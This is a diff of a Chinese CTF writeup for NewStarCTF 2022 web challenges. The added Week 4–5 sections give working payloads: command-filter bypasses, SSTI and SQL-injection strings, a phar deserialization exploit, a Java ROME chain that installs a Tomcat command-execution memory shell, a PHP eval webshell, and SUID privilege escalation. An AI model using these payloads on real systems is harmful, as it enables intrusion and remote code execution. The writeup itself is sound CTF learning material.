@@ -1,8 +1,8 @@
 ---
 title: "2022 NewStarCTF Web Writeup"
-date: 2022-10-03T16:20:17+08:00
-lastmod: 2022-10-03T16:20:17+08:00
-draft: true
+date: 2022-10-23T9:20:17+08:00
+lastmod: 2022-10-23T9:20:17+08:00
+draft: false
 author: "X1r0z"
 
 tags: ['ctf']
@@ -18,9 +18,11 @@ math:
 lightgallery: false
 ---
 
+题目挺简单的, 但是也学到了一些比较细节的技巧
+
 <!--more-->
 
-## WEEK1 WEB
+## Week1 Web
 
 ### HTTP
 
@@ -104,7 +106,7 @@ post: num=2077
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031637351.png)
 
-## WEEK2 WEB
+## Week2 Web
 
 ### Word-For-You(2 Gen)
 
@@ -363,7 +365,7 @@ id=1&data={"query":"{
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031730530.png)
 
-## WEEK3 WEB
+## Week3 Web
 
 ### BabySSTI_One
 
@@ -472,3 +474,377 @@ O:17:"first\second\user":2:{s:8:"username";s:3:"123";s:8:"password";N;}
 flag 在环境变量里
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031818099.png)
+
+## Week4 Web
+
+### So Baby RCE
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET["cmd"])){
+    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
+       echo "Don't Hack Me";
+    }else{
+        system($_GET["cmd"]);
+    }
+}else{
+    show_source(__FILE__);
+}
+```
+
+变量 + `%0a` 绕过
+
+`/` 得用环境变量去构造, 但是类似 `${PATH:0:1}` 这种切片一直用不了, 不知道怎么回事...
+
+最后换成了 sed, 直接把 index.php 中的第六行, 即 `}else{` 删掉
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121324796.png)
+
+然后执行命令查看 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121325010.png)
+
+### BabySSTI_Two
+
+懒得写了... 过滤跟上一周的那题差不多
+
+通过方括号去访问对应属性
+
+```
+http://44ad0597-f152-4e7f-820f-5417399b6406.node4.buuoj.cn:81/
+?name={{lipsum['__glob''als__']['__buil''tins__']['__impo''rt__']('os')['po''pen']('c''at${IFS}/fl''ag_in_h3r3_52daad').read()}}
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121330870.png)
+
+### UnserializeThree
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121331105.png)
+
+右键源代码可以看到 class.php
+
+```php
+<?php
+highlight_file(__FILE__);
+class Evil{
+    public $cmd;
+    public function __destruct()
+    {
+        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
+            //Same point ,can you bypass me again?
+            eval("#".$this->cmd);
+        }else{
+            echo "No!";
+        }
+    }
+}
+
+file_exists($_GET['file']);
+```
+
+过滤了尖括号和换行符, 不好直接闭合
+
+但是本地试了下 `\r` 也可以达到与 `\n` 类似的效果, 从而跳出 `#` 的污染
+
+之后就是简单 phar 反序列化
+
+```php
+<?php
+
+class Evil{
+    public $cmd;
+}
+
+$a = new Evil();
+$a->cmd = "\rsystem(\$_GET[1]);";
+
+$phar =new Phar("phar.phar"); 
+$phar->startBuffering();
+$phar->setStub("<?php XXX __HALT_COMPILER(); ?>");
+$phar->setMetadata($a); 
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+?>
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121336010.png)
+
+### 又一个SQL
+
+提示查询 100, 一开始不知道什么意思, 试了好久才发现是个整数类型的注入...
+
+过滤了 `/**/`, 用 `/*123*/` 绕过
+
+```sql
+-100/*123*/union/*123*/select/*123*/group_concat(text),2/*123*/from/*123*/wfy_comments
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121345473.png)
+
+### Rome
+
+下载 jar 文件后用 jd-gui 打开
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121352431.png)
+
+springboot 的项目, helloCTF 方法为反序列化入口点
+
+poc.xml 里面看到了 rome 的依赖
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121357711.png)
+
+猜测是 rome 反序列化
+
+参考文章 [](https://www.anquanke.com/post/id/258575)
+
+ysoserial 中的利用链
+
+```
+/**
+ *
+ * TemplatesImpl.getOutputProperties()
+ * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
+ * NativeMethodAccessorImpl.invoke(Object, Object[])
+ * DelegatingMethodAccessorImpl.invoke(Object, Object[])
+ * Method.invoke(Object, Object...)
+ * ToStringBean.toString(String)
+ * ToStringBean.toString()
+ * ObjectBean.toString()
+ * EqualsBean.beanHashCode()
+ * ObjectBean.hashCode()
+ * HashMap<K,V>.hash(Object)
+ * HashMap<K,V>.readObject(ObjectInputStream)
+ *
+ **/
+```
+
+写 payload 的时候把 HashMap 换成了 BadAttributeValueExpException, 前者要写反射比较麻烦
+
+然后参考文章里的代码解决了回显的问题
+
+```java
+package com.example.javasec;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import com.sun.syndication.feed.impl.ToStringBean;
+import javassist.*;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.management.BadAttributeValueExpException;
+import javax.servlet.Filter;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.Base64;
+import java.util.Properties;
+
+public class Demo{
+    public static class Evil extends AbstractTranslet{
+        static {
+            try {
+                Class WebappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
+                Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
+                Field WebappClassLoaderBaseResource = WebappClassLoaderBaseClz.getDeclaredField("resources");
+                WebappClassLoaderBaseResource.setAccessible(true);
+                Object resources = WebappClassLoaderBaseResource.get(webappClassLoaderBase);
+                Class WebResourceRoot = Class.forName("org.apache.catalina.WebResourceRoot");
+                Method getContext = WebResourceRoot.getDeclaredMethod("getContext", null);
+
+                StandardContext standardContext = (StandardContext) getContext.invoke(resources, null);
+
+                Filter filter = (servletRequest, servletResponse, filterChain) -> {
+
+                    InputStream fis = Runtime.getRuntime().exec(servletRequest.getParameter("cmd")).getInputStream();
+                    byte[] buffer = new byte[16];
+                    StringBuilder res = new StringBuilder();
+                    while (fis.read(buffer) != -1) {
+                        res.append(new String(buffer));
+                        buffer = new byte[16];
+                    }
+                    fis.close();
+
+                    servletResponse.getWriter().write(res.toString());
+                    servletResponse.getWriter().flush();
+                };
+                FilterDef filterDef = new FilterDef();
+                filterDef.setFilterName("A");
+                filterDef.setFilterClass(filter.getClass().getName());
+                filterDef.setFilter(filter);
+                standardContext.addFilterDef(filterDef);
+                FilterMap filterMap = new FilterMap();
+                filterMap.setFilterName("A");
+                filterMap.addURLPattern("/*");
+                standardContext.addFilterMap(filterMap);
+                standardContext.filterStart();
+                System.out.println("injected");
+            }catch (Throwable t){
+                t.printStackTrace();
+            }
+        }
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+        }
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+        }
+    }
+    public static void main(String[] args) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+        byte[][] bytecodes = new byte[][]{clazz.toBytecode()};
+
+        Class templatesImplClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
+        Constructor constructor = templatesImplClass.getDeclaredConstructor(
+                byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class);
+        constructor.setAccessible(true);
+        TemplatesImpl templatesImpl = (TemplatesImpl) constructor.newInstance(
+                bytecodes, "test", new Properties(), 1, new TransformerFactoryImpl()
+        );
+        ToStringBean bean = new ToStringBean(Templates.class, templatesImpl);
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        setFieldValue(badAttributeValueExpException, "val", bean);
+
+        ByteArrayOutputStream arr = new ByteArrayOutputStream();
+        try (ObjectOutputStream output = new ObjectOutputStream(arr)){
+            output.writeObject(badAttributeValueExpException);
+        }
+        byte[] base64code = Base64.getEncoder().encode(arr.toByteArray());
+        String payload = new String(base64code);
+        System.out.println(payload);
+
+    }
+
+    public static void setFieldValue(Object obj, String name, Object val) throws Exception{
+        Field f = obj.getClass().getDeclaredField(name);
+        f.setAccessible(true);
+        f.set(obj, val);
+    }
+
+}
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121412841.png)
+
+exp 发送前需要 urlencode 一次
+
+最后再次请求, 传参 cmd
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210121413397.png)
+
+## Week5 Web
+
+### Give me your photo PLZ
+
+.htaccess 解析漏洞
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171427721.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171427587.png)
+
+### BabySSTI_Three
+
+过滤了下划线和一些关键词, 转成十六进制或者 unicode 绕过
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171428267.png)
+
+### Unsafe Apache
+
+apache 2.4.50, 存在目录遍历和命令执行
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171429512.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171429560.png)
+
+### So Baby RCE Again
+
+```php
+<?php
+error_reporting(0);
+if(isset($_GET["cmd"])){
+    if(preg_match('/bash|curl/i',$_GET["cmd"])){
+        echo "Hacker!";
+    }else{
+        shell_exec($_GET["cmd"]);
+    }
+}else{
+    show_source(__FILE__);
+}
+```
+
+基本等于没过滤...
+
+先用 echo 写一个 webshell
+
+```bash
+cmd=echo "<?php eval(\$_REQUEST[1]);?>" > a.php
+```
+
+因为默认的 shell 是 sh, 直接弹会有点问题, 所以要先把命令写到文件里, 然后用 bash 执行
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171434889.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171434330.png)
+
+ffll444aaggg 文件权限是 700, 估计要提权
+
+按照正常题目的思路先看一下 SUID
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171436939.png)
+
+发现 date 命令, 于是尝试用 date 读取 flag
+
+```bash
+date -f /ffll444aaggg
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171437267.png)
+
+### Final round
+
+name 处时间盲注
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171438253.png)
+
+python 脚本
+
+```python
+import requests
+import time
+
+url = 'http://f4911839-e2b4-40ac-8bcc-4ccfe9d34b73.node4.buuoj.cn:81/comments.php'
+
+dicts = r'{}_AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
+
+flag = 'flag{'
+
+for i in range(6,99999):
+    for s in dicts:
+        time.sleep(0.3)
+        payload = "if(ascii(substr((select(group_concat(text))from(wfy_comments)where(text)regexp('flag')),{},1))={},sleep(0.5),0)".format(i,ord(s))
+        start_time = time.time()
+        print(s)
+        res = requests.post(url,data={'name': payload})
+        stop_time = time.time()
+        if stop_time - start_time >= 5:
+            flag += s
+            print('FOUND!!!',flag)
+            break
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171439736.png)
